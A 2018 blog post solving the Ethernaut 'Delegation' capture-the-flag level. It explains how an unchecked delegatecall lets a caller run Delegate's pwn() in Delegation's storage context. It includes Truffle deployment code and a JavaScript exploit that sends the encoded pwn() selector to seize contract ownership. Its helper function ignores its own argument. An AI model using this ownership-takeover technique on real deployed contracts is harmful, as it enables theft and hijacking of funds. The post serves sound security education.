Title: Solving Zeppelin's Ethernaut CTF - Delegation
Date: 2018-08-05 16:00
Tags: ethereum, solidity, ctf, smart contracts
Category: Ethereum
Slug: solving-zeppelin-ethernaut-ctf-delegation
Summary: Post #7 of a series in which we tackle the challenges in the [Ethernaut CTF by Zeppelin](https://ethernaut.zeppelin.solutions/){:target="_blank",:rel="noopener"}. In Delegation, we study how to exploit a trustful contract that uses a not-so-safe low-level call.

## Introduction
If you haven't realized by now, let me tell you something, Solidity's low-level calls are definitely not your best friends. I'm talking about `call`, `callcode` and `delegatecall`. They can be deceiving, as we've already seen in [Fallback](https://www.notonlyowner.com/ethereum/solving-zeppelin-ethernaut-ctf-fallback/). That's the reason why many static analyzers will raise an alarm whenever any of them is found. I'm not saying you shouldn't use them - they exist for a reason - but, beware.

Now go take a look at the [Delegation challenge](https://ethernaut.zeppelin.solutions/level/0x68756ad5e1039e4f3b895cfaa16a3a79a5a73c59){:target="_blank",:rel="noopener"} and come back once you're done.

In a nutshell, we're are given an instance of the Delegation contract over which we should claim ownership. As you may have seen, the contract only has one function that we can interact with, which happens to be its fallback function. Quite a narrow scope there - so it all comes down to this line: `delegate.delegatecall(msg.data)`, the vuln must be there. Let's see what `delegatecall` does.

## In delegatecall we trust
Sadly, in this case.

First of all, `delegatecall` is just another type of message that smart contracts can send to each other - with some peculiarities, but a message at the end of the day. According to the [Solidity docs on delegatecall](https://solidity.readthedocs.io/en/v0.4.24/introduction-to-smart-contracts.html#delegatecall-callcode-and-libraries):

> [...] is identical to a message call apart from the fact that the code at the target address is executed in the context of the calling contract and `msg.sender` and `msg.value` do not change their values.

Yeap, chinese is easier, I know. Let's put this straight.

Imagine two happy friends: Alan and Bob. Alan is the laziest guy ever, he does not even bother to do anything himself, 'cause why do something when someone else can do it for you, right ? So whenever he needs to do the cleaning at home, he calls his super trustworthy BFF, Bob. Alan happens to be super trustful of Bob, I mean, like hell. So he not only let's Bob do the work, but also gives Bob all the keys to his house. All of them, even the safe-deposit box key. 

The thing is, Bob ain't no saint either. He gained Alan's **trust**, and now can do whatever he pleases with Alan's belongings. He can move around anything in Alan's house, even those things that were to be kept private.

Now imagine Alan and Bob are not humans, but smart contracts. We'll call them A and B for short. Whenever A calls delegatecall on B (B.delegatecall(...)) he's letting B proccess the whole call. B has now access to A's storage and can modify it freely. For instance, in the Delegation challenge, B (Delegate) could potentially change the owner of A (Delegation). How can we achieve that ?

## In delegate call we shouldn't have trust
Check Delegate's code. In particular, this function:

~~~solidity
function pwn() public {
        owner = msg.sender;
}
~~~

Whoever calls that `pwn` function, automatically becomes the owner of the contract. Now what if we called it through `delegatecall` ? As we read in the docs: `msg.sender` does not changes its original value, and the call would be executed **in the caller's context**. Which means that, to pass the challenge, we need to call Delegate's `pwn` function through the `delegatecall` in the Delegation contract. That way, the owner of Delegation would be changed to the sender who sent the initial call to Delegate.

Enough talk. Let's do it.

## Exploiting an unsafe delegatecall
Include both Delegate.sol and Delegation.sol in your `contracts` folder. Then write the deployment scripts as follows and run `npx truffle migrate`:

~~~javascript
let Delegate = artifacts.require('./Delegate.sol')
let Delegation = artifacts.require('./Delegation.sol')

module.exports = deployer => {
    // We first deploy Delegate to obtain its address
    deployer.deploy(Delegate, web3.eth.accounts[0]).then(() => {
        // Once Delegate is deployed, pass its address to the Delegation contract constructor
        return deployer.deploy(Delegation, Delegate.address)
    })
}
~~~

For the exploit, create a new file in your `exploits` folder called `delegation.exploit.js`. Set it up following the same structure we used for previous exploits.

~~~javascript
const DelegationContract = artifacts.require('Delegation')
const assert = require('assert')

async function execute(callback) {

    // Instance the Delegation contract
    let delegationContract = await DelegationContract.deployed()
    
    // Get the attacker account
    let attackerAccount = web3.eth.accounts[1]
    console.log(`Attacker address: ${attackerAccount}`)

    // Check who's the owner of the Delegation contract
    let owner = await delegationContract.owner.call()
    console.log(`Initial owner: ${owner}`)
    
    // Actual exploit will be here

    callback()
}
~~~

Next step: calling the fallback function of Delegation. In previous posts we saw that in order to execute a contract's fallback function code, all we need to do is send a transaction to the contract. However, this will be a special case.

All Ethereum transactions include a `data` field, in which we can include a payload we want to send to a contract. For instance, a contract's function signature and parameters that we wish to call. By inspecting Delegation's code, you can see that everything inside the `data` field is be passed to the Delegate contract and executed by it. Thus, we will call the `pwn` function, but first we'll need to encode it the Ethereum way.

To do so, we need to hash the prototype string of the function like functionName(type1,type2,...) with Keccak256, and then take only the first 4 bytes. That is why you will often see something like `bytes4(keccak256(...))` in Solidity code. Yet, we're writting Javascript here, not Solidity, and we can take advantage of `web3` utility functions.

The final part of the exploit looks like:

~~~javascript
await delegationContract.sendTransaction({
        from: attackerAccount,
        data: encodeFunctionSignature('pwn()')
})

// Check who's the owner of the Delegation contract
owner = await delegationContract.owner.call()
assert.equal(owner, attackerAccount)
console.log(`Final owner: ${owner}`)
~~~

And the `encondeFunctionSignature` function goes like this:

~~~javascript
function encodeFunctionSignature(functionName) {
    return web3.eth.abi.encodeFunctionSignature('pwn()')
}
~~~

You can check what that `web3` function is actually doing in here: [https://github.com/ethereum/web3.js/blob/1.0/packages/web3-eth-abi/src/index.js#L199](https://github.com/ethereum/web3.js/blob/1.0/packages/web3-eth-abi/src/index.js#L199){:rel="noopener"}


All set! You can now call `npx truffle exec exploits/delegation.exploit.js`, pwn the Delegation contract, and finally become its owner!

Find the full exploit code at [https://github.com/tinchoabbate/ethernaut-ctf/blob/master/exploits/delegation.exploit.js](https://github.com/tinchoabbate/ethernaut-ctf/blob/master/exploits/delegation.exploit.js){:rel="noopener"}.

That's it, another challenged solved. In the next post, we'll tackle [Force](https://ethernaut.zeppelin.solutions/level/0x24d661beb31b85a7d775272d7841f80e662c283b){:rel="noopener"} and, spoiler alert, learn how to press a hidden self-destruct button that all smart contracts have.
